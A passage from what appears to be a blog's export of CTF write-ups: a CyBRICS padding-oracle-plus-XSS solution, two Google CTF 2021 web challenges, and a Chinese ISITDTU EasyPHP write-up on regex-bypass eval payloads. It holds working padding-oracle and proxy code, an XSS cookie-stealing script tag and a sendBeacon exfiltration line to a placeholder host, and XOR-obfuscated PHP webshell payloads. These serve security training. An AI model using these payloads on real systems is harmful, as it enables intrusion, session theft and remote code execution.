http://207.154.224.121:8080/finalize?fisrtName=xxx&amp;lastName=xxx, we will receive a aztec code, which embeds a piece of base64-encoded data. We can upload the aztec code through http://207.154.224.121:8080/upload, and get a successful “you are now registered“ response (but this’s not what we want). Later, we found something interesting after changing some byte of the base64-encoded data. We got a *”PADDING_ERROR”* response by modifying some byte of the data. It immediately occurred to us that this might well be an instance of padding oracle attack. To confirm the intuition we just developed, we generated a aztec code, base64 decoded it into ciphertext, XORed every 256 possible byte value (0~256) in the last byte of the second last ciphertext block, base64 encoded back to a aztec code (utilizing python aztec_code_generator module), and uploaded the aztec code to the server. We received 256 responses, 255 of whose status code is 200, with only one response whose status code is 500. Among the 255 responses, XORing by b\"\\x00\" in the last byte got a “Success“ reponse and the remaining 254 are all “PADDING_ERROR” responses. This implied that only the “Success“ response one and the 500 status code one got correctly padded plaintext after decryption on the server side. The “Success“ response was due to it’s the original unmodified padded plaintext, while the 500 status code one was because the plaintext after decryption was somewhat modified to be correctly padded and we can gain knowledge of the last byte of the original plaintext by making use of this. By continously sending carefully modified ciphertext to the server and then distinguishing whether or not the server responses with “PADDING_ERROR“, we can recover the whole plaintext byte by byte. This is the so-called padding oracle attack. Padding Oracle AttackSo, how does the padding oracle attack work? First, we need to understand what is padding. It is known that block ciphers can transform (encrypt/decrypt) a plaintext/ciphertext block. 16 bytes data in the case of AES, into a ciphertext/plaintext block. Using some block cipher mode of operation, we can repeatedly apply the block cipher encrypting/decrypting operation on amouts of data whose length is more than a block. For example, AES-CBC mode can encrypt/decrypt multiple blocks. But what if the length of data is not a multiple of the block length? The answer is to use some kind of padding methods, which append some data at the end of the last block to make it a full block. One of the most widely used padding method is PKCS#7 padding method. PKCS#7 first calculates the number of bytes ( pad_length) to be padded, and then appends to the last plaintext block pad_length bytes, with each byte value being pad_length. Upon unpadding, the last byte of the decryption result is extracted and parsed as the pad_length, after which pad_length long bytes are truncated at the end. Below is a Python implementation of PKCS#7 padding and unpadding. 123456789101112def pad(pt): pad_length = 16 - len(pt)%16 pt += bytes([pad_length]) * pad_length return ptdef unpad(pt): pad_length = pt[-1] if not 1 &lt;= pad_length &lt;= 16: return None if pad(pt[:-pad_length]) != pt: return None return pt[:-pad_length] Note that a valid padding check is done after unpadding. This means that only the following 16 formats of the last block is considered as valid. All the other formats of data are invalid and will produce a PADDING_ERROR response, which is a padding oracle that we will exploit later. Another point to be noted is that, even if the length of plaintext is a multiple of the block size, padding is still needed. In this case, 0x10 bytes will be appended, with each byte value being \\x10. Before moving on, we also need to be fimilar with AES-CBC, which is the most common mode that padding oracle attack can be mounted on. In CBC mode, plaintext is padded and divided into several plaintext blocks. Each plaintext block is XORed with the previous ciphertext block before being AES encrypted. The first plaintext block is XORed with a randomly generated initializaiton vector (IV). The final encryption result is the concatenation of the ciphertext blocks with IV at the head. Decryption just reverses these operations. One significant drawback of AES-CBC is that it does not solely provide intergrity protection. In other words, the attacker can modify the ciphertext (such as bit flipping) and send the modified ciphertext to the server without being noticed. This gives way to the padding oracle attack. Now, we can dive into the very details on how the padding oracle works. Suppose the attack has possession of a ciphertext which can be divided into an IV and 3 ciphertext blocks c1, c2, c3 . The purpose of the attacker is to decrypt the last ciphertext block c3. The attacker changes the last byte of c2 (XORed with some value), and then send it to the server. The server responses with either a “PADDING_ERROR“ response or a 500 status code reponse. If we gets a 500 status code response, we succeed. This implies that the unpadding check is passed, and the last plaintext block MUST end with b\"\\x01, one of the 16 valid padding format. After recovering the last byte, we can move on to decrypt all the previous bytes of the last plaintext block. For example, to decrypt the second last byte, we can utilize the b\"\\x02\\x02\" padding format. Since we already have had knowledge of the last byte of plaintext, we can modify the last byte into any value we want by XOR something in c2. At present, what we want is to make the last byte be b\"\\x02\", we XOR the last byte of c2 with the last byte of plaintext to cancel it into b\"\\x00\", then XOR in b\"\\x02\", resulting to b\"\\x02\". Then, try every 255 possible byte value guess_byte XOR b\"\\x02\" (except b\"\\x00\") to XOR with the last second byte of c2, and send the modified ciphertext to the padding oracle until a 500 status code response, thus recovering the second last plaintext byte, which is exactly guess_byte. The following is the Python code that can be used to, given ciphertext, recover the last plaintext block. 123456789101112131415161718192021222324252627282930313233343536import requestsimport base64import aztec_code_generator# padding_oracle recovers the last 16 plaintext bytes of the given ciphertextdef padding_oracle(cipher): plaintext = b\"\" for index in range(1, 17): print(f\"[*] index: {index}\") for byte in range(0, 256): bytes_xor = b\"\\x00\"*(16-index)+bytes([byte^index])+xor(plaintext,bytes([index]*(index-1))) new_cipher = cipher[:-32] + xor(cipher[-32:-16], bytes_xor) + cipher[-16:] b64data = base64.b64encode(new_cipher) code = aztec_code_generator.AztecCode(b64data) code.save(f\"./pics/{byte}.png\", module_size=4) f = open(f\"./pics/{byte}.png\", \"rb\").read() paramsMultipart = [('file', ('1.png', f, 'application/png'))] response = session.post(\"http://207.154.224.121:8080/upload\", files=paramsMultipart) if response.status_code == 200: body = response.content.split(b'&lt;div class=\"content__i\"&gt;')[1].split(b\"div\")[0] if b\"PADDING\" in response.content: print(f\"[{byte:&gt;3d}] Status code: {response.status_code}, PADDING ERROR\") else: print(f\"[{byte:&gt;3d}] Status code: {response.status_code}, {body}\") else: # response.status_code == 500 print(f\"[{byte:&gt;3d}] Status code: {response.status_code}\") plaintext = bytes([byte]) + plaintext print(f\"plaintext: {plaintext}\") break return plaintext Recovering the Entire PlaintextBy exploting the padding oracle, we are enabled to decrypt the last plaintext block byte by byte. Can we go any further? The answer is yes. Once we have recovered the last plaintext block, we can drop the last ciphertext block, and continue to exploit the padding oracle to recover the second last plaintext block. Keep doing this, and we will recover all the plaintext blocks, namely the entire plaintext. In practice, we implemented the attack and succssfully recovered the entire plaintext, which was a json formatted data. 1b'{\"name\": \"12321\", \"surname\": \"123\", \"middle\": \"1\", \"time\": \"2021-07-26 13:37:00\", \"dest\": \"\", \"dep\": \"\", \"flight\": \"BLZH1337\"}\\x02\\x02' At this point, we got to know how the server side might process the uploaded aztec code. After receiving the code, the server decoded it into ciphertext, decrypted the ciphertext, and unpadded the decryption result. If something wrong happened during unpadding, the server replied with a “PADDING_ERROR“ response. After unpadding, the plaintext was then unmarshaled into an object (by something like JSON.parse()). If any error occurred, the server replied with a 500 status code response. The server would send back us a “Success” response if everything’s ok. Arbitrary Plaintext EncryptionRecovering the entire plaintext is not enough to solve this challenge. We can go more further to craft the ciphertext of arbitrary plaintext that we want. To achieve this goal, we need to combine bit flip attack with the padding oracle attack. Bit flip attack enables us to change the plaintext into what we want, and the padding oracle attack functions as a decryption oracle to help us decrypt any ciphertext. Say the ciphertext IV || c1 || c2 || c3 decrypts into p1 || p2 || p3, and we want to get the ciphertext of p1' || p2' || p3. We first XOR c1 with p2 XOR p2' to get c1'. In this way, IV || c1' || c2 || c3 will be decrypted into junk || p2' || p3. The nasty junk block consists of random byte values, which is unknown to us, and the decryption result cannot be parsed correctly by JSON.parse(). What we can do with it? Remember the padding oracle attack to recover the last plaintext block? Yes, we can reuse the padding oracle attack to recover the junk block. After that, we XOR IV with junk XOR p1' to get a new IV'. In this way, IV' || c1' || c2 || c3 will be decrypted into p1' || p2' || p3, which is exactly we want! The XSS PartSo we could encrypt what we want now. What should we do next? According to the description of the challenge, we have to go and get the content of the central surveillance system to get the information of Mr.Flag Flagger. But how? Let’s take a look at the json. There may be a bot in the backend use JSON.parse() to parse the json and some method to render a page with these json data. For example, res.render(\"render.html\", name=json.name, surname=json.surname). So we could try to inject a XSS vector into the plaintext, encrypt it and then send the payload to the bot through the upload API. But, at first we need to understand the correspondence between API parameters and JSON parameters. After do a test, we generate a ciphertext through the /finalize API and decrypt the ciphertext to get the correspondence. 12345678URL:http://207.154.224.121:8080/finalize?lastName=1&amp;firstName=2&amp;origin=3&amp;Gender=4&amp;destination=5CipherText:8BAHi37U69MYAnP4O4cHrpRIJrT3dKwv7uRCoLYzU2vnxEOCb6vT0LffcAROX3jPZ+p4yDtKRXwcxYF9B22a3PH3m9tIiEDc3OrwR9W/ACyIcPw7XEJKAyB3QlHiFn2j0HC8P8SpwFqe4A/NRCESLI996IzP9Rkw066eGSuK0MxhpBXGV2gqfm4FAgqTLE3NPlainText:b'{\"name\": \"2\", \"surname\": \"1\", \"middle\": \"4\", \"time\": \"2021-07-26 13:37:00\", \"dest\": \"5\", \"dep\": \"3\", \"flight\": \"BLZH1337\"}' Okay. But which one we should inject the XSS vector? You could try one by one but I think there is a hint in the source code of the challenge. 12345&lt;!--&lt;h2&gt;Passenger data&lt;/h2&gt;&lt;h3&gt;Name:&lt;/h3&gt;&lt;h4&gt;qweqwe&lt;/h4&gt;--&gt; It looks like the Name is what we want. So we should craft a payload like this. 1{\"name\": \"&lt;script src=http://your_url/?2&gt;&lt;/script&gt;\", \"surname\": \"1\", \"middle\": \"4\", \"time\": \"2021-07-26 13:37:00\", \"dest\": \"5\", \"dep\": \"3\", \"flight\": \"BLZH1337\"} When we generate the ciphertext, we first need to generate a cipher whose the length of the name parameter is the same length as the name parameter in the XSS payload we constructed. In this exmaple, the name is &lt;script src=http://your_url/?2&gt;&lt;/script&gt; and its length is 40. Therefore, we should generate a ciphertext with a name of length 40 through the /finalize API. And we’d better leave the other parameters as default values. 12345URL:http://207.154.224.121:8080/finalize?lastName=1&amp;firstName=0000000000000000000000000000000000000000&amp;origin=3&amp;Gender=4&amp;destination=5PlainText:b'{\"name\": \"0000000000000000000000000000000000000000\", \"surname\": \"1\", \"middle\": \"4\", \"time\": \"2021-07-26 13:37:00\", \"dest\": \"5\", \"dep\": \"3\", \"flight\": \"BLZH1337\"}' After we get the ciphertext, we need to change the plaintext of the ciphertext using padding oracle and bit flipping. And then use base64 and aztec code to encode the ciphertext and upload the aztec code. At last, XSS fires! Now, we get the admin’s cookie and the source code of the admin’s page. After having used the cookie to visit the page as admin, we found the page only had a search function. I thought I needed to do SQL injection to get the flag. But at last, we just searched ‘Flagger’ as described in the challenge and got the flag. Thanks for your reading. Hope you like the writeup! XD","link":"/2021/08/02/cybrics-checkin-2021/"},{"title":"Two Webs' Writeup in Google CTF Quals 2021","text":"I played Google CTF Quals 2021 and here is my writeup. I played with the Tea Deliverers team in the Google CTF Quals 2021. We sovled 2 webs in Google CTF 2021 quals but I think I have only made a small contribution. In the end, we got 11th rank, sadly I couldn’t do much. Hope I could do more in the next time! OK. Let’s talk about the CTF. Empty LSThere is a web challenge called empty ls. This challenge examines a security risk in the MTLS scenario. We could get the following information from the challenge: There is a website https://www.zone443.dev/. Two primary services are offered on this website. This website provides a user registration service and offers user’s certificates for download. You could register a user and get a client certificate for your identity. Another service is that it also provides a subdomain registration service. You could register a subdomain under zone443.dev and set an A record to an IP. So it means you could get a sub-domain that is entirely under your control. The challenge provides an example code and a client CA cert which could be used to verify users. Besides, you could report an URL, and the admin will check it. There is another website https://admin.zone443.dev. If you visit the admin’s website with your certificate, it will return ‘Hello, user. You are not the admin.’ The ‘user’ is exactly your username when you registered on www.zone443.dev. So, obviously, we need to access this site as admin or steal the response when the admin visits the admin.zone443.dev in some way. At first, I came up with an idea. Maybe we could steal the admin’s client certificate when the admin visits our website. After we get the admin’s certificate, we could try to use it to forge as admin and visit the admin.zone443.dev. But the idea is too naive. After I learn about some docs about MTLS, this may be impossible. So I get stuck. Although the above idea doesn’t work, I think we are still on the right way. At least, our target in this challenge is much more evident than the target in letschat. (In the challenge letschat, we even don’t know what the target is, where the flag is and what we should access). After a few hours, we found an interesting point. The certificate of the admin.zone443.dev is the wildcard. It is *.zone443.dev. But what does it mean? Then I tried to google ‘HTTPS wildcard certificate’ and ‘TLS client auth bypass’. The bad news is I couldn’t get anything helpful to solve the challenge. We are stuck again until we came up with another idea. In the period, we also found that admin.zone443.dev doesn’t check the host. So this means there will be no warnings if you visit a subdomain whose A record is 34.140.9.160(the A record of admin.zone443.dev). That’s an interesting phenomenon. OK. Let’s talk about XSS. If we want to read the content of the admin’s page, we need XSS. But if we’re going to XSS on our subdomain to read the content of the admin’s page, we need to break the same-origin policy. Is it really a way using a feature of HTTPS we don’t know to bypass the same-origin policy? Based on the question, we thought, how about DNS Rebinding? But there are quite a few limitations. The max execution time of the bot’s chrome is about 10s, but the time of chrome’s DNS cache is 60s. You can’t set two A records when you register your subdomain, either. It seems we are stuck again. All right. Let’s review the whole challenge. Do you still remember we could take all control of a subdomain? Yeah. It means we could do what we want to do on it. So what about traffic forwarding? If we forward the traffic to admin.zone443.dev when the admin visits our website, what do you think will happen next? The response is from admin.zone443.dev, but the domain is our domain! Why? As we said above, the certificate of admin.zone443.dev is wildcard, and it ignores the host header in HTTP, so there will be no warnings and no errors in this period. What’s more, for admin, he actually visits admin.zone443.dev with his certificate, and for browser, it thinks the domain admin visits is our domain. So, in this scenario, if we send an AJAX request to request the admin’s response on our domain, the browser will think this request doesn’t violate the same-origin policy. Because the domain which admin visit is our domain, the domain which AJAX requests is also our domain. It makes sense! Quite like a variant DNS Rebinding. The process of the exploit is as follows. Register a subdomain through the subdomain registration service, which is provided by the challenge. Report your subdomain to admin. The admin’s browser makes the first request. At this time, the admin will visit your site and execute javascript on your page. The JS code will make an AJAX request to your subdomain. The second request is made by AJAX. You should forward the traffic to admin.zone443.dev at this time. In the end, after you get the response from AJAX, send the response to your HTTP log in some way, and you could get the flag. That’s all the process to solve the challenge. We write a go server to forward the traffic. Thanks to my great teammate. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116package mainimport ( \"crypto/tls\" \"crypto/x509\" \"encoding/pem\" \"fmt\" \"io\" \"io/ioutil\" \"log\" \"net\" \"github.com/valyala/fasthttp\" \"golang.org/x/sync/errgroup\")// clientCAPool consructs a CertPool containing the client CA.func clientCAPool()( * x509.CertPool, error) { caCertPem, err: = ioutil.ReadFile(\"clientca.crt.pem\") if err != nil { return nil, fmt.Errorf(\"error reading clientca cert: %v\", err) } caCertBlock, rest: = pem.Decode(caCertPem) if caCertBlock == nil || len(rest) &gt; 0 { return nil, fmt.Errorf(\"error decoding clientca cert PEM block. caCertBlock: %v, len(rest): %d\", caCertBlock, len(rest)) } if caCertBlock.Type != \"CERTIFICATE\" { return nil, fmt.Errorf(\"clientca cert had a bad type: %s\", caCertBlock.Type) } caCert, err: = x509.ParseCertificate(caCertBlock.Bytes) if err != nil { return nil, fmt.Errorf(\"error parsing clientca cert ASN.1 DER: %v\", err) } cas: = x509.NewCertPool() cas.AddCert(caCert) return cas, nil}func servePage(conn net.Conn) error { log.Printf(\"serve page\") clientCA, err: = clientCAPool() if err != nil { return err } serverCert, err: = tls.LoadX509KeyPair(\"fullchain.pem\", \"privkey.pem\") if err != nil { return err } tlsConn: = tls.Server(conn, &amp; tls.Config { Certificates: [] tls.Certificate { serverCert }, ClientAuth: tls.VerifyClientCertIfGiven, ClientCAs: clientCA, }) err = tlsConn.Handshake() if err != nil { return err } srv: = fasthttp.Server { DisableKeepalive: true, Handler: fasthttp.FSHandler(\"static\", 0), } return srv.ServeConn(tlsConn)}func serveProxy(conn net.Conn) error { next, err: = net.Dial(\"tcp\", \"admin.zone443.dev:443\") if err != nil { return err } var group errgroup.Group group.Go(func() error { _, err: = io.Copy(conn, next) return err }) group.Go(func() error { _, err: = io.Copy(next, conn) return err }) return group.Wait()}func main() { lis, err: = net.Listen(\"tcp\", \":https\") if err != nil { log.Fatalf(\"Failed to listen: %v\", err) } count: = 0 for { conn, err: = lis.Accept() if err != nil { log.Fatalf(\"Failed to accept: %v\", err) } count++ if count == 1 { go func() { err: = servePage(conn) if err != nil { log.Printf(\"Failed to serve page: %v\", err) } }() } else { go func() { err: = serveProxy(conn) if err != nil { log.Printf(\"Failed to serve proxy: %v\", err) } }() } }} The javascript code is something like this. 1234567var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() { navigator.sendBeacon('https://http_log', this.responseText)};xhttp.open(\"GET\", \"/\", true);xhttp.withCredentials = true;xhttp.send(); At last, we got the flag. Pretty cool, man! GPU ShopThis challenge has an environment that is so complex that I don’t know how to explain it. I want to try my best to describe the setting of the challenge in short. The challenge provides two services. The first service is a reverse proxy service https://paymeflare-web.2021.ctfcompetition.com. After you log in to this site with your Google account, you could set some settings according to the document. The reverse proxy will set an HTTP header x-pay and visit your IP. If you want to visit the URL which has ‘checkout’, the proxy will add an HTTP header ‘X-Wallet’. There is another service http://gpushop.2021.ctfcompetition.com. This website uses the paymeflare service as the reverse proxy. You could buy the flag on this website. When you try to buy the flag, it will get the eth address from the HTTP header ‘X-Wallet’. Request the balance of the eth address through cloudflare-eth.com. If your balance is greater than your cost, you will get the flag. We don’t know how to solve the challenge, so we ask our boss to get a pretty rich eth address and buy the flag in the end. Although there are many proxies in the challenge, we could use URLEncode to bypass the ‘checkout’ limitation, and the backend will not get the ‘X-Wallet’ header. The GPU shop will get a pretty rich eth address because of the code used in gpushop. 1234function format_addr($addr) {truereturn '0x'.str_pad($addr, 40, '0', STR_PAD_LEFT);}$order-&gt;wallet = $this-&gt;format_addr($request-&gt;header('X-Wallet')); When the header ‘X-Wallet’ is not set, the value of $order-&gt;wallet is 0x0000000000000000000000000000000000000000 and the balance of this address is 0x1c923afe206b9068f3f which is greater than the cost of flag 1537550000000000000000. So we could buy the flag. Other WebsThere are other two webs. One of them is callled letschat. In this challenge, you need to do a lot of brainstorming, and we take pretty much time to solve this challenge but still fail in the end. Although the intended solution is to predict the UUID of the message, I realized that some teams bruted the UUID to get the flag. Mmm, this really makes me mad. It’s too guessy and pretty annoying. I initially thought this challenge was inspired by some slack’s vulnerabilities from the real world, but the intended solution beat me. The last web is an XSS challenge created by @terjanq. Pretty cool and amazing. You could read this simple solution written by him. Thanks for reading. Hope my bad English has not affected your reading of this article. :&gt;","link":"/2021/07/21/google-qual-2021/"},{"title":"ISITDTU CTF 2019 EasyPHP 回顾","text":"文章首发于先知社区：https://xz.aliyun.com/t/5677 在 ISITDTU CTF 2019 上做了一道比较有意思的代码审计题，主要应用了 php 异或等操作进行 getshell，收获还是挺多的。最近越来越喜欢看这种代码简单，但是又蕴含玄机的东西了… Description ​ Don’t try to run any Linux command, just use all the PHP functions you know to get the flag 123456789101112&lt;?phphighlight_file(__FILE__);$_ = @$_GET['_'];if ( preg_match('/[\\x00- 0-9\\'\"`$&amp;.,|[{_defgops\\x7F]+/i', $_) ) die('rosé will not do it');if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die('you are so close, omg');eval($_);?&gt; Write UpExplation题目代码比较简单，首先看看第一个正则： 再看看第二个过滤，strtolower将字符串转换为小写，用count_chars返回由所有使用了的字节值组成的字符串，再判断其中每个字符累计出现次数是否大于 13 DoingStep 1既然正则约束了比较多的条件，自然我们首先得看看还有哪些可用的。 1234567891011121314151617&lt;?php $arr = get_defined_functions()['internal'];foreach ($arr as $key =&gt; $value) { if ( preg_match('/[\\x00- 0-9\\'\"`$&amp;.,|[{_defgops\\x7F]+/i', $value) ){ unset($arr[$key]); continue; } if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){ unset($arr[$key]); continue; }}var_dump($arr);?&gt; 得到还剩下以下内置函数可用： 1234567891011121314151617181920212223242526272829303132array(15) { [206]=&gt; string(5) \"bcmul\" [1060]=&gt; string(5) \"rtrim\" [1066]=&gt; string(4) \"trim\" [1067]=&gt; string(5) \"ltrim\" [1078]=&gt; string(3) \"chr\" [1102]=&gt; string(4) \"link\" [1103]=&gt; string(6) \"unlink\" [1146]=&gt; string(3) \"tan\" [1149]=&gt; string(4) \"atan\" [1150]=&gt; string(5) \"atanh\" [1154]=&gt; string(4) \"tanh\" [1255]=&gt; string(6) \"intval\" [1403]=&gt; string(4) \"mail\" [1444]=&gt; string(3) \"min\" [1445]=&gt; string(3) \"max\"} 这样这题看起来与国赛那个 Love_Math 题目就有点类似了，看起来intval跟chr貌似有点搞头，但是数字却又被 ban 掉了…那我们就只能另寻他路了… Step 2虽然双引号跟单引号都被 ban 掉了，但是我们知道 php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型，所以即使双引号跟单引号被 ban 了其实并没有太大的影响。而我们还可以知道，字符串还可以用!操作符来进行布尔类型的转换，如下： 123456php &gt; var_dump(!a);PHP Notice: Use of undefined constant a - assumed 'a' in php shell code on line 1bool(false)php &gt; var_dump(!!a);PHP Notice: Use of undefined constant a - assumed 'a' in php shell code on line 1bool(true) 可以再加一个@忽略 notice 输出 1234&lt;?phpvar_dump(@a); //string(1) \"a\"var_dump(!@a); //bool(false)var_dump(!!@a); //bool(true) 而对 bool 类型使用加法的时候， php 则会将 bool 类型处理为数字，true 转换为 1 ， false 为 0 ，所以我们又可以利用这一点来实现数字计算： 123&lt;?phpvar_dump(!!@a + !!@a); //int(2) 1+1var_dump((!!@a + !!@a) * (!!@a + !!@a + !!@a + !!@a)); //int(6) (1+1)*(1+1+0+1) 所以，这样大概我们就可以利用chr()进行数字转换得到字符了，并且我们还可以利用\"phpinfo\"()的特性，通过字符串拼凑，可以得到 phpinfo: 1234567(chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a)).chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a )).chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a)).chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a ) + !!@a).chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) * ((!!@a + !!@a + !!@a) ** (!!@a + !!@a) )).chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a ) - !!@a - !!@a).chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a) - !!@a))(); 但是这里要需要用到.进行字符串拼接，然而.又被 ban 掉了，所以我们得另寻他路 Step 3观察正则表达式，我们还可以使用的符号有： 1['!', '%', '+', '-', '*', '/', '&gt;', '&lt;', '?', '=', ':', '@', '^'] 我们可以注意到另一个比较明显的点，就是^异或符号没有被 ban ，在一些免杀马里面就经常用^异或来进行混淆。通过查阅 php文档 我们可以知道 ​ If both operands for the &amp;, | and ^ operators are strings, then the operation will be performed on the ASCII values of the characters that make up the strings and the result will be a string. In all other cases, both operands will beconverted to integers and the result will be an integer. 字符串的异或操作是基于字符的 ASCII 码来进行操作的，例如： 12345678910php &gt; var_dump(@a^\"1\");string(1) \"P\"php &gt; echo ord(\"a\");97php &gt; echo ord(\"1\");49php &gt; echo 97^49;80php &gt; echo chr(80);P 我们就可以利用之前的数字操作加上异或就可以得到我们自己想要的操作了。 12345678910111213141516php &gt; var_dump(@p^\"1\");string(1) \"A\"php &gt; var_dump(@h^\"1\");string(1) \"Y\"php &gt; var_dump(@i^\"1\");string(1) \"X\"php &gt; var_dump(@n^\"4\");string(1) \"Z\"php &gt; var_dump(@f^\"1\");string(1) \"W\"php &gt; var_dump(@o^\"5\");string(1) \"Z\"php &gt; var_dump(@phpinfo^\"1111415\");string(7) \"AYAXZWZ\"php &gt; var_dump(@AYAXZWZ^\"1111415\");string(7) \"phpinfo\" 接下来就是数学时间了，另外，对于 int 型到 string 的转换，我们可以利用trim进行操作。 1234567var_dump( trim( (!!@a + !!@a + !!@a + !!@a + !!@a) * ((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) + (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a) + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) * ((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a+ !!@a+ !!@a) + (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a ) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a) - !!@a - !!@a- !!@a) ) ^ @AYAXZWZ);//phpinfo 结果回显you are so close, omg Step 4绕过了正则接下来就是处理每个字符出现次数得小于 13 的问题了。 所以我们需要精简一下异或操作，尽量找一些相同的字符进行操作，我们可以找到如下的异或关系： 1234567p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9|h: |Q ^ 9|X ^ 0|Y ^ 1|Z ^ 2|p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9|i: |Q ^ 8|X ^ 1|Y ^ 0|Z ^ 3|n: |V ^ 8|W ^ 9|X ^ 6|Y ^ 7|Z ^ 4|f: |Q ^ 7|R ^ 4|T ^ 2|U ^ 3|V ^ 0|W ^ 1|o: |V ^ 9|W ^ 8|X ^ 7|Y ^ 6|Z ^ 5| 尽量找到相同字符进行拼凑，我们就可以得到AYAYYRY ^ 1110746，AYR加上trim中的tim，再加上!!(+*);，我们这样只用 13 个字符得到了phpinfo()。 1(AYAYYRY^trim(((((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a)))+(((!!a+!!a))**((!!a))))))(); 这里可能需要注意的就是将+进行 urlencode ，因为+在 url 中是空格。 Step 5所以我们只需要按照同样的编码方式，尽量找相同的字符，就可以执行相关的 php 函数了，通过以下步骤就可以拿到 flag 了 1234567var_dump(scandir(getcwd()));array(4) { [0]=&gt; string(1) \".\" [1]=&gt; string(2) \"..\" [2]=&gt; string(9) \"index.php\" [3]=&gt; string(34) \"n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt\" }var_dump(file_get_contents(end(scandir(getcwd()))));string(34) \"ISITDTU{Your PHP skill is so good}\" Another Way-Step 1单次异或可能会有一定的局限性，我们也可以通过两次或者多次异或来进行字符串的构造： 1(qiqhnin^iiiiibi^hhhhimh)();//phpinfo() Another Way-Step 2接着我们就可以通过十六进制异或来进行字符串操作了。例如： 123print_r ^ 0xff -&gt; 0x8f8d96918ba08d -&gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%8f%8d%96%91%8b%a0%8d))scandir ^ 0xff -&gt; 0x8c9c9e919b968d -&gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%91%9b%96%8d)) . ^ 0xff -&gt; 0xd1 -&gt; ((%ff)^(%d1)) 当然也可以不使用 0xff ，使用以下 payload 就可以在没有字符限制的时候进行列目录了： 1((%ff%ff%ff%ff%ff%ff%ff)^(%8f%8d%96%91%8b%a0%8d))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%91%9b%96%8d))(((%ff)^(%d1)))); Another Way-Step 3通过总结我们所需要的字母：._acdinprst，然后进行类似的构造： 123456t = s^c^dn = i^c^dr = a^c^pprint_r -&gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))scandir -&gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f)) 即可进行函数操作了 Another Way 2看这题的时候想起了p牛的几篇文章，大家可以参考一下： 一些不包含数字和字母的webshell 无字母数字webshell之提高篇 这两篇也给了我当时很大的启发以及思路。尤其是第二篇中的 payload ，其实可以直接拿来用 大家可以详细的参考这两篇文章，p牛第一篇是通过位运算以及自增来进行操作，第二篇在 php7 环境下则是通过取反来进行操作，这里前面就简单介绍了一下通过异或的操作形式。 Bonus题外话，看到 @Mr.Liu 师傅写的一个随机异或免杀的马，还是比较有意思的一个项目:Github地址 Reference[EasyPHP (871 points)](https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU CTF 2019 Quals/web/easyphp.md) ISITDTU CTF 2019 - EasyPHP 一些不包含数字和字母的webshell 无字母数字webshell之提高篇","link":"/2019/07/20/isitdtu-2019/"},{"title":"NSCTF 2019 WP","text":"这是一个绿盟弄的 CTF ，因为在复习考试所以没怎么玩…随便玩了一下顺手写个 wp WebWeb1地址在http://39.106.184.130:8084/ 扫目录得到.DS_Store文件，使用 lijiejie 的 dstore_exp 